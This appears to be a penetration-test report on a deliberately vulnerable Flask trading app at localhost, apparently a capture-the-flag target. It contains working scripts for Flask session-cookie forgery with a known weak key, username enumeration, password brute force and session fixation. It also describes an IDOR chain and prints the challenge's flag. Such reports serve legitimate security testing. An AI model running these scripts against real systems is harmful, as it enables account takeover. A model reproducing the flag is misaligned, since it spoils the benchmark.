# Security Assessment Report

## Executive Summary
- **Target:** http://localhost:36493
- **Assessment Date:** January 29, 2025
- **Scope:** Authentication, XSS, SQL and Command Injection, SSRF, Authorization testing

## Summary by Vulnerability Type

**Authentication Vulnerabilities:**
Multiple critical authentication vulnerabilities were successfully exploited, including session forgery via hardcoded weak secret key (`'your_secret_key'`), default test credentials (`test:test`), user enumeration via differential error messages, and information disclosure before authentication. The application lacks rate limiting on authentication endpoints, allowing unlimited brute force attempts at 345 requests/second on username enumeration and 252 passwords/second on password guessing. Session management is critically flawed with no session rotation (fixation vulnerability), incomplete session invalidation on logout, and no session timeout mechanisms. These vulnerabilities enable complete authentication bypass and account takeover without requiring network-level access.

**Authorization Vulnerabilities:**
A critical horizontal authorization bypass vulnerability was successfully exploited in the order archive endpoint (`/order/<order_id>/archive`). The endpoint performs no ownership validation before allowing any authenticated user to archive any order, enabling unauthorized access to order receipts including the CTF flag (FLAG{7ef0f69d288b3bb79dd210f4b4bc3b26a1d8c3d615294a2ee6cc3a81c2c5b7fa}) stored in order 300198. A secondary workflow authorization bypass was exploited in the two-stage authentication flow, allowing direct access to the password verification page without completing username verification, disclosing user first names and internal user IDs without authentication.

**Cross-Site Scripting (XSS) Vulnerabilities:**
No XSS vulnerabilities were found. While three client-side XSS sinks were identified in code analysis (using `document.write()` and jQuery `.html()` methods), these could not be exploited through the public network interface as the application provides no mechanism to inject or modify order data through HTTP endpoints. All orders are created during application initialization with static data. The server-side Jinja2 auto-escaping provides effective XSS protection for the implemented functionality.

**SQL/Command Injection Vulnerabilities:**
No SQL or command injection vulnerabilities were found. All database queries use parameterized SQLAlchemy ORM methods, providing complete protection against SQL injection. No command execution functionality exists in the network-accessible codebase - no usage of subprocess module, os.system(), eval(), or exec() with user input was detected.

**Server-Side Request Forgery (SSRF) Vulnerabilities:**
No SSRF vulnerabilities were found. The application is completely self-contained with no HTTP client libraries, no outbound request capabilities, and no external service integrations. All redirects use hardcoded Flask route names via `url_for()` with no user-controllable URL destinations. The application interacts exclusively with an internal MySQL database via the Docker bridge network.

## Network Reconnaissance

**Open Ports and Exposed Services:**
The target system exposes multiple services across the localhost interface. The application is accessible on a dynamically mapped port (36493 in current deployment), fronted by Caddy HTTP server on port 80 and Apache 2.4.65 on port 8080. Additional services detected include CUPS print service on port 631 and a Tailscale VPN service on port 49152 (both unrelated to the application). Notably, port 443 is open for SSL/HTTPS but not configured for the application, which runs exclusively on HTTP.

**Security Misconfigurations:**
The Apache web server configuration contains a critical wildcard CORS policy (`Access-Control-Allow-Origin: *`) allowing unrestricted cross-origin access. Cache-Control headers are misconfigured with conflicting directives - the application sets both restrictive (`no-cache, no-store, must-revalidate`) and permissive (`public, max-age=0`) values, with the latter overwriting the former. Critical security headers are absent: no Content-Security-Policy, X-Frame-Options, X-Content-Type-Options, Strict-Transport-Security (HSTS), or Referrer-Policy. The application uses MySQL 5.7 which reached end-of-life in October 2023 and no longer receives security updates.

**Infrastructure Vulnerabilities:**
The application runs on HTTP-only transport with no TLS/HTTPS implementation, transmitting all credentials and session cookies in plaintext. The Flask session secret key is hardcoded as `'your_secret_key'`, enabling trivial session forgery. Database credentials are hardcoded in the connection string (`root:trading_platform_db`) with the application using the MySQL root account, violating the principle of least privilege. The database operates at READ UNCOMMITTED isolation level, creating race condition vulnerabilities.

# Authentication Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTH-VULN-04: Session Forgery via Weak Secret Key

**Summary:**
- **Vulnerable location:** Flask session cookie signing mechanism (`app/__init__.py:11`)
- **Overview:** Complete authentication bypass by forging session cookies using the hardcoded weak secret key `'your_secret_key'`
- **Impact:** Any attacker can impersonate any user without credentials, achieving complete account takeover
- **Severity:** CRITICAL

**Prerequisites:**
- Knowledge of the weak secret key: `'your_secret_key'`
- Python with Flask library installed

**Exploitation Steps:**

1. Create a Python script to forge Flask session cookies:
```python
from flask.sessions import SecureCookieSessionInterface
from flask import Flask

SECRET_KEY = 'your_secret_key'
PAYLOAD = {'user_id': 10032}  # Target user ID

app = Flask(__name__)
app.secret_key = SECRET_KEY
session_interface = SecureCookieSessionInterface()
serializer = session_interface.get_signing_serializer(app)
forged_cookie = serializer.dumps(PAYLOAD)
print(f"Forged cookie: {forged_cookie}")
```

2. Execute the script to generate forged session cookie:
```bash
python3 forge_session.py
```

Output:
```
Forged cookie: eyJ1c2VyX2lkIjoxMDAzMn0.aQJLkw.G_vN7rMPblvzl3mCx7N0HlrDNCQ
```

3. Use the forged cookie to access protected resources:
```bash
curl -H "Cookie: session=eyJ1c2VyX2lkIjoxMDAzMn0.aQJLkw.G_vN7rMPblvzl3mCx7N0HlrDNCQ" \
  http://localhost:36493/dashboard
```

**Proof of Impact:**
- Successfully accessed dashboard as user "John Doe" (test user, ID 10032)
- Response: `Welcome, John Doe`
- Complete authentication bypass achieved without any legitimate credentials
- Can forge cookies for any user ID to impersonate any account

**Notes:**
This is the most critical authentication vulnerability. The hardcoded weak secret key enables trivial session forgery, bypassing all authentication controls. An attacker needs zero interaction with the application to create valid session tokens.

---

### AUTH-VULN-11: Default Test Credentials

**Summary:**
- **Vulnerable location:** Hardcoded test account creation (`app/__init__.py:26-38`)
- **Overview:** Default credentials `test:test` provide immediate authenticated access
- **Impact:** Instant account takeover without brute force or exploitation required
- **Severity:** CRITICAL

**Prerequisites:** None

**Exploitation Steps:**

1. Navigate to the login page:
```bash
curl http://localhost:36493/
```

2. Submit username in first authentication stage:
```bash
curl -X POST http://localhost:36493/ -d "username=test"
```

Response: HTTP 302 redirect to `/password/test`

3. Submit password in second authentication stage:
```bash
curl -X POST http://localhost:36493/password/test -d "password=test" -c cookies.txt
```

Response: HTTP 302 redirect to `/dashboard?username=test` with session cookie set

4. Access authenticated resources:
```bash
curl -b cookies.txt http://localhost:36493/dashboard
```

**Proof of Impact:**
- Successfully authenticated as user "John Doe"
- Dashboard displays: "Welcome, John Doe"
- Access to protected endpoints: `/orders`, `/orders_archive`, `/order/*/receipt`
- Complete account takeover of test user account

**Notes:**
Credentials explicitly documented in HTML comment at `login.html:1`: `<!-- TODO: Delete the testing account (test:test). -->`

---

### AUTH-VULN-12: User Enumeration via Error Messages

**Summary:**
- **Vulnerable location:** Login endpoint (`routes.py:20-33`)
- **Overview:** Different error messages and HTTP responses reveal valid vs invalid usernames
- **Impact:** Attackers can enumerate all valid usernames to build target lists for credential attacks
- **Severity:** HIGH

**Prerequisites:** None

**Exploitation Steps:**

1. Test with invalid username:
```bash
curl -X POST http://localhost:36493/ -d "username=nonexistentuser123"
```

Response: `User not found` (displayed on login page)

2. Test with valid username:
```bash
curl -X POST http://localhost:36493/ -d "username=test"
```

Response: HTTP 302 redirect to `/password/test`

3. Automated enumeration script testing 9 usernames in rapid succession:
```python
import requests

usernames = ['test', 'admin', 'administrator', 'root', 'user', 
             'john', 'alice', 'bob', 'invaliduser999']

for username in usernames:
    r = requests.post('http://localhost:36493/', 
                     data={'username': username}, 
                     allow_redirects=False)
    
    if r.status_code == 302:
        print(f"[VALID] {username}")
    elif "User not found" in r.text:
        print(f"[INVALID] {username}")
```

**Proof of Impact:**
- Successfully enumerated valid username: `test`
- Confirmed 8 invalid usernames: admin, administrator, root, user, john, alice, bob, invaliduser999
- No rate limiting encountered (all 9 attempts completed instantly)
- Built list of valid accounts for targeted password attacks

---

### AUTH-VULN-13: Information Disclosure Before Authentication

**Summary:**
- **Vulnerable location:** Password page (`routes.py:45-66`, `password.html:26,29`)
- **Overview:** User metadata disclosed before authentication completion
- **Impact:** Reveals first names, user IDs, and username confirmation without valid credentials
- **Severity:** HIGH

**Prerequisites:** Knowledge of a valid username (obtainable via AUTH-VULN-12)

**Exploitation Steps:**

1. Access password page directly with valid username:
```bash
curl http://localhost:36493/password/test
```

2. Extract disclosed information from response:
```bash
curl -s http://localhost:36493/password/test | grep -E "Welcome|user_id"
```

**Proof of Impact:**
Response reveals:
```html
<p class="mt-3 text-center">Welcome, John!</p>
<input type="text" class="form-control" id="user_id" name="user_id" value="10032" hidden>
```

Disclosed information without authentication:
- First name: "John"
- User ID: 10032
- Username confirmation: "test" (in URL)

**Notes:**
This information aids social engineering attacks and reveals internal user ID structure (sequential integers).

---

### AUTH-VULN-07: No Rate Limiting on Login Endpoint

**Summary:**
- **Vulnerable location:** Login endpoint (`routes.py:20-33`)
- **Overview:** Unlimited username enumeration and brute force attempts without throttling
- **Impact:** Enables automated username discovery and credential stuffing at high speed
- **Severity:** HIGH

**Prerequisites:** None

**Exploitation Steps:**

1. Execute rapid-fire login attempts:
```python
import requests
import time

start = time.time()
attempts = 50

for i in range(attempts):
    r = requests.post('http://localhost:36493/', 
                     data={'username': f'testuser{i}'})

duration = time.time() - start
print(f"Completed {attempts} attempts in {duration:.2f} seconds")
print(f"Rate: {attempts/duration:.2f} requests/second")
```

**Proof of Impact:**
Results from automated testing:
- **Total attempts:** 50
- **Duration:** 0.14 seconds
- **Rate:** 345.49 requests per second
- **Success rate:** 100% (no throttling, no failures)
- **Average response time:** 0.003 seconds

No protective mechanisms observed:
- No HTTP 429 (Too Many Requests)
- No progressive delays
- No CAPTCHA challenges
- No IP-based blocking
- No account lockout

---

### AUTH-VULN-08: No Rate Limiting on Password Endpoint

**Summary:**
- **Vulnerable location:** Password verification endpoint (`routes.py:45-66`)
- **Overview:** Unlimited password guessing attempts without throttling or lockout
- **Impact:** Enables high-speed password brute force attacks against known usernames
- **Severity:** HIGH

**Prerequisites:** Valid username (obtainable via AUTH-VULN-12)

**Exploitation Steps:**

1. Execute password brute force attack:
```python
import requests
import time

passwords = ['test', 'password', 'admin', '123456', 'password123', 
             'letmein', 'qwerty', 'welcome', 'monkey', 'dragon',
             'baseball', 'iloveyou', 'trustno1', 'sunshine', 'master',
             'welcome1', 'football', 'shadow', 'michael', 'jennifer',
             'abc123', '12345678', 'password1', 'secret', 'superman']

start = time.time()

for pwd in passwords:
    r = requests.post('http://localhost:36493/password/test',
                     data={'password': pwd},
                     allow_redirects=False)
    
    if r.status_code == 302 and 'dashboard' in r.headers.get('Location', ''):
        print(f"[SUCCESS] Password found: {pwd}")
        break

duration = time.time() - start
```

**Proof of Impact:**
Results from automated testing:
- **Passwords tested:** 25
- **Duration:** 0.0991 seconds
- **Rate:** 252.36 passwords per second
- **Correct password found:** `test` (on attempt #1)
- **No throttling detected**

Attack scalability:
- With 252 passwords/second, can test common password lists:
  - Top 1,000 passwords: ~4 seconds
  - Top 10,000 passwords: ~40 seconds
  - Top 100,000 passwords: ~7 minutes
- Parallel connections could achieve 1000+ passwords/second

---

### AUTH-VULN-03: Session Fixation

**Summary:**
- **Vulnerable location:** Session management (`routes.py:57`)
- **Overview:** Session IDs not rotated after authentication
- **Impact:** Attackers can fix a victim's session ID before authentication, then hijack after login
- **Severity:** HIGH

**Prerequisites:** None

**Exploitation Steps:**

1. Attacker obtains a session cookie before authentication
2. Victim authenticates with the attacker-controlled session cookie
3. Attacker's session becomes authenticated as the victim

Demonstration via automated script:
```python
import requests

# Step 1: Create session before authentication
session = requests.Session()
r1 = session.get('http://localhost:36493/')
pre_auth_cookies = session.cookies.get_dict()
print(f"Pre-auth cookies: {pre_auth_cookies}")

# Step 2: Authenticate with same session
r2 = session.post('http://localhost:36493/', 
                  data={'username': 'test'})
r3 = session.post('http://localhost:36493/password/test',
                  data={'password': 'test'})

post_auth_cookies = session.cookies.get_dict()
print(f"Post-auth cookies: {post_auth_cookies}")

# Step 3: Verify same session token grants access
r4 = session.get('http://localhost:36493/dashboard')
print(f"Dashboard access: {r4.status_code}")
```

**Proof of Impact:**
- Session cookie created after authentication: `eyJ1c2VyX2lkIjoxMDAzMn0.aQJNxQ.qyuHmOreSFJBjQZyPTn3BtLYIPw`
- Session cookie does NOT rotate when authentication occurs
- Stolen/fixed session cookies remain valid after victim authentication
- Successfully accessed `/dashboard` with fixed session (HTTP 200)

**Notes:**
Flask does not automatically rotate session IDs. The application sets `session['user_id'] = user.id` without calling `session.regenerate()` or `session.clear()` first.

---

### AUTH-VULN-05: Incomplete Session Invalidation on Logout

**Summary:**
- **Vulnerable location:** Logout handler (`routes.py:37-41`)
- **Overview:** Logout only removes `user_id` from session but doesn't invalidate the session server-side
- **Impact:** Session cookies remain valid after logout, enabling session replay attacks
- **Severity:** HIGH

**Prerequisites:** Valid authenticated session

**Exploitation Steps:**

1. Authenticate and capture session cookie:
```bash
# Authenticate
curl -c session.txt -X POST http://localhost:36493/ -d "username=test" -L
curl -b session.txt -c session.txt -X POST http://localhost:36493/password/test -d "password=test" -L
```

2. Verify authenticated access before logout:
```bash
curl -b session.txt http://localhost:36493/dashboard
```

Response: HTTP 200 with "Welcome, John Doe"

3. Perform logout:
```bash
curl -b session.txt -c session_after_logout.txt -X POST http://localhost:36493/logout -L
```

4. Attempt to access dashboard with OLD session cookie:
```bash
curl -b session.txt http://localhost:36493/dashboard
```

**Proof of Impact:**
- **Before logout:** Dashboard accessible (HTTP 200, 2139 bytes)
- **Logout executed:** POST /logout returned 302 redirect
- **After logout:** Dashboard STILL accessible with old cookie (HTTP 200, 2139 bytes)
- Session remained valid server-side despite logout

**Notes:**
The logout implementation only executes `session.pop('user_id', None)` which removes the user_id key from the session cookie but does not invalidate the session on the server. Since Flask uses client-side signed sessions, there is no server-side session store to invalidate.

---

### AUTH-VULN-06: No Session Timeout

**Summary:**
- **Vulnerable location:** Application configuration (`app/__init__.py`)
- **Overview:** No session timeout mechanism implemented
- **Impact:** Captured session cookies remain valid indefinitely
- **Severity:** MEDIUM

**Prerequisites:** Valid session cookie

**Exploitation Steps:**

Session cookies remain valid until:
- Explicit logout (which we've proven is incomplete via AUTH-VULN-05)
- Browser closure (browser session only)
- Never expires server-side

**Proof of Impact:**
Code analysis confirms:
- No `PERMANENT_SESSION_LIFETIME` configuration in `__init__.py`
- No `SESSION_PERMANENT` setting
- No idle timeout checks
- No absolute timeout enforcement

Practical demonstration:
```bash
# Create session
curl -c cookies.txt -X POST http://localhost:36493/ -d "username=test" -L
curl -b cookies.txt -c cookies.txt -X POST http://localhost:36493/password/test -d "password=test" -L

# Session cookie remains valid indefinitely
# Test after arbitrary delay:
sleep 60
curl -b cookies.txt http://localhost:36493/dashboard
```

Session cookie continues to work without time-based expiration.

**Notes:**
Combined with AUTH-VULN-05 (incomplete logout), this means stolen sessions can be used indefinitely by attackers.

---

# Authorization Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTHZ-VULN-01: Horizontal Authorization Bypass via IDOR in Order Archive Endpoint

**Summary:**
- **Vulnerable location:** `GET /order/<order_id>/archive` (routes.py:135)
- **Overview:** Missing ownership validation allows any authenticated user to archive any order by manipulating the order_id parameter, thereby gaining unauthorized access to order receipts including the CTF flag
- **Impact:** Complete bypass of horizontal authorization controls; unauthorized access to sensitive financial transaction data belonging to other users; CTF flag capture from order 300198
- **Severity:** Critical

**Prerequisites:**
- Valid authentication credentials (any authenticated user account)
- Knowledge of target order ID (enumerable through sequential iteration)
- Target application accessible at: http://localhost:36493

**Exploitation Steps:**

1. **Authenticate as any valid user**
   ```
   Navigate to: http://localhost:36493
   Enter username: test
   Click "Login" button
   Enter password: test
   Click "Login" button
   ```
   Expected result: Successful authentication, redirected to /dashboard

2. **Execute IDOR attack by directly accessing the archive endpoint for order 300198**
   ```
   Navigate to: http://localhost:36493/order/300198/archive
   ```
   Expected result: Application sets current user as the archiver of order 300198 without validating ownership
   
   Technical details:
   - The vulnerable code at routes.py:135 performs: `Order.query.filter(Order.id == order_id).first_or_404()`
   - Missing authorization check that should validate: `Order.creator == current_user`
   - The application sets `order.archiver = current_user` and `order.archived = True` without ownership validation

3. **Verify successful privilege escalation by viewing archived orders**
   ```
   Navigate to: http://localhost:36493/orders_archive
   ```
   Expected result: Order 300198 (ticker "FLAG", date 05/16/2024, SELL 1 @ $1) appears in the archived orders list

4. **Access the order receipt to retrieve unauthorized data (CTF flag)**
   ```
   On the /orders_archive page:
   Click the "Receipt" link for the FLAG order (order ID 300198)
   ```
   Expected result: Receipt modal displays with Order ID 300198 and the CTF flag

**Proof of Impact:**

Successfully captured CTF flag through unauthorized access:
```
Order ID: 300198
Flag: FLAG{7ef0f69d288b3bb79dd210f4b4bc3b26a1d8c3d615294a2ee6cc3a81c2c5b7fa}
```

**Evidence of Complete Authorization Bypass:**
- Authenticated as user "test" (user_id: 10032)
- Order 300198 was NOT created by user "test" (creator_fk is NULL, indicating system-generated order)
- Successfully became the archiver of order 300198 without ownership validation
- Gained authorized access to the receipt endpoint through the dual ownership check: `or_(Order.creator == user, Order.archiver == user)`
- Retrieved sensitive financial transaction data and CTF flag from another user's order

**Notes:**
This vulnerability demonstrates a complete horizontal authorization bypass. The receipt endpoint itself (routes.py:102) correctly validates that the requesting user is either the creator OR archiver of the order. However, the archiver status can be illegitimately obtained through the IDOR vulnerability in the archive endpoint (routes.py:135), which performs no ownership check before setting the archiver field. This creates an attack chain where proper authorization on one endpoint is circumvented by exploiting missing authorization on a related endpoint.

---

### AUTHZ-VULN-02: Context/Workflow Authorization Bypass in Two-Stage Login Flow

**Summary:**
- **Vulnerable location:** `GET /password/<username>` (routes.py:45-66)
- **Overview:** Missing workflow state validation allows direct access to Stage 2 of the authentication flow without completing Stage 1, resulting in information disclosure of user's first name and internal user ID
- **Impact:** User enumeration, information disclosure (PII), bypasses intended two-stage authentication workflow
- **Severity:** High

**Prerequisites:**
- No authentication required (unauthenticated attack)
- Knowledge of valid usernames (can be obtained through username enumeration at the login endpoint)
- Target application accessible at: http://localhost:36493

**Exploitation Steps:**

1. **Ensure unauthenticated state**
   ```
   If logged in, navigate to: http://localhost:36493
   Click "Logout" button
   ```
   Expected result: Logged out, returned to login page

2. **Directly access the password verification endpoint, bypassing Stage 1**
   ```
   Navigate directly to: http://localhost:36493/password/test
   (Replace "test" with any valid username to enumerate)
   ```
   Expected result: Application displays password entry form without validating that Stage 1 was completed

3. **Extract disclosed information from the page**
   ```
   Observe the page content:
   - Displayed text: "Welcome, [FirstName]!" reveals user's first name
   - View page source or inspect DOM:
   - Hidden input field: <input type="text" name="user_id" value="[USER_ID]" hidden>
   ```

**Proof of Impact:**

Successfully bypassed workflow validation and obtained user information without authentication:

**For username "test":**
- First Name: John
- Internal User ID: 10032
- Obtained without completing Stage 1 (username verification)
- Obtained without any authentication

**Exploitation Command Sequence:**
```bash
# Direct unauthenticated access to password page
curl -v http://localhost:36493/password/test

# Extract first name from response:
# Look for: <p>Welcome, John!</p>

# Extract user_id from hidden field:
# Look for: <input type="text" name="user_id" value="10032" hidden>
```

**Evidence of Workflow Bypass:**
- The intended authentication workflow requires users to:
  1. Submit username at `POST /` (Stage 1)
  2. Get redirected to `/password/<username>` (Stage 2)
  3. Submit password
- No session marker, nonce, or token is set during Stage 1 to validate proper workflow progression
- Stage 2 can be accessed directly via `GET /password/<username>` without completing Stage 1
- The vulnerability exists at routes.py:45-66, where the password endpoint has no validation that the user progressed through Stage 1

**Technical Details:**
The vulnerable code at routes.py:47 performs:
```python
user = User.query.filter_by(username=username).first()
```
This query retrieves user information based solely on the username in the URL path parameter, with no validation that:
- The user completed Stage 1 (username verification)
- Any session state exists
- A workflow token or nonce was provided

The template (password.html:26) then renders:
```html
<p>Welcome, {{ user.first_name }}!</p>
```
And exposes the user_id in a hidden field (password.html:29):
```html
<input type="text" name="user_id" value="{{ user.id }}" hidden>
```

**Notes:**
This vulnerability allows attackers to enumerate valid usernames and collect PII (first names and internal user IDs) without any authentication. The two-stage login flow provides no security benefit as both stages are independently accessible. This violates the principle that workflow steps should validate prerequisite completion through state management (session tokens, nonces, or workflow tracking).

---